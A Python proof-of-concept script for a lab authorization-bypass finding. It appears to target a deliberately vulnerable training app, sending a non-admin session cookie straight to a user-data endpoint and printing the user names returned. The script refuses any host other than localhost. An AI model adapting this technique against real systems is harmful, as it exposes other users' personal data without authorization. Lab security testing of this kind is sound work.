#!/usr/bin/env python3
'''AUTH-001 F1 draft: a non-admin session calls get_user_data.php directly.
Read-only. Local authorised lab only; no redirects, no third-party libraries.
'''
import argparse, http.client, json, sys
from urllib.parse import urlparse

PATH = '/vulnerabilities/authbypass/get_user_data.php'


def fail(message):
    print('ERROR: ' + message, file=sys.stderr)
    sys.exit(2)


ap = argparse.ArgumentParser()
ap.add_argument('--base-url', required=True)
ap.add_argument('--session-file', required=True)
ap.add_argument('--security-level', default='low')
ap.add_argument('--target-id', default=None)
ap.add_argument('--timeout', type=float, default=10.0)
args = ap.parse_args()

base = urlparse(args.base_url)
if base.scheme not in ('http', 'https'):
    fail('base URL must be http or https')
if (base.hostname or '').lower() not in ('localhost', '127.0.0.1', '::1'):
    fail('only localhost, 127.0.0.1 or ::1 are permitted')
with open(args.session_file, 'r', encoding='utf-8') as handle:
    cookie = handle.readline().strip()
if '=' not in cookie:
    fail('session file must contain a Cookie value such as PHPSESSID=...')
cookie = cookie + '; security=' + args.security_level

cls = http.client.HTTPSConnection if base.scheme == 'https' else http.client.HTTPConnection
conn = cls(base.hostname, base.port, timeout=args.timeout)
try:
    conn.request('GET', PATH, headers={'Accept': 'application/json',
                                       'Cookie': cookie,
                                       'Connection': 'close'})
    response = conn.getresponse()
    status = response.status
    raw = response.read()
except (OSError, http.client.HTTPException) as exc:
    fail('request failed: %s' % exc)
finally:
    conn.close()

text = raw.decode('utf-8', 'replace')
try:
    data = json.loads(text)
except ValueError:
    fail('non-JSON response (status=%s, redirect or error page?): %r' % (status, text[:200]))

if isinstance(data, dict):
    print('DENIED status=%s error=%r' % (status, data.get('error')))
    sys.exit(1)

rows = {str(row['user_id']): row for row in data if isinstance(row, dict) and 'user_id' in row}
print('READ status=%s rows=%d' % (status, len(rows)))
for uid in sorted(rows, key=lambda value: (len(value), value)):
    row = rows[uid]
    print('user_id=%s first_name=%r surname=%r' % (uid, row.get('first_name'), row.get('surname')))
if args.target_id is not None:
    hit = rows.get(str(args.target_id))
    print('TARGET_FOUND=%s' % (hit is not None))
    if hit is None:
        sys.exit(3)
    print('TARGET_READ id=%s first_name=%r surname=%r' % (args.target_id, hit.get('first_name'), hit.get('surname')))